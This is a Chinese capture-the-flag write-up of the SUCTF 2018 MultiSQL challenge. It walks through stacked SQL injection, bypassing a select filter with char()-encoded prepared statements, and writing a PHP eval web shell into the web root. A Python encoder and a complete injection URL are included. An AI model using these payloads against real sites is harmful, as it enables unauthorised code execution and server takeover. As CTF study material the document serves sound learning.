# [SUCTF 2018]MultiSQL MYSQL 预处理写

首先这道题需要预处理写马 之前在ctfshow中学习过预处理

我们来看看

 [CTFSHOW -SQL 注入-CSDN博客](https://blog.csdn.net/m0_64180167/article/details/134380357) 

首先我们开始判断是否存在注入

```cobol
2^(if(1=0,1,0))
 
2^(if(ascii(mid(user(),1,1))>0,0,1))
 
判断出存在sql注入
```

然后我们开始fuzz  发现 select ，union 都没了

但是我们如果 ; 发现可以闭合 所以这里是存在堆叠注入的

但是是没有回显的

```sql
1;show databases;
```

所以我们看看能不能写木马

```sql
select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php

这个是我们的木马
```

然后我们进行预处理

```python
但是这里select 被过滤了
 
所以我们使用char 拼接绕过
 
str = "select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"
len_str = len(str)
for i in range(0,len_str):
    if i==0:
        print('char(%s' %ord(str[i]),end='')
    else:
        print(',%s' %ord(str[i]),end='')
print(')')
```

```scss
char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
```

然后直接执行



<img src="https://i-blog.csdnimg.cn/blog_migrate/94b60eb51a5553df588b7c279350531a.png" alt="" style="max-height:350px; box-sizing:content-box;" />


```sql
?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare abcd from @sql;execute abcd;
```

这里就实现了绕过 并且执行了命令

```cobol
/favicon/shell.php
```

即可实现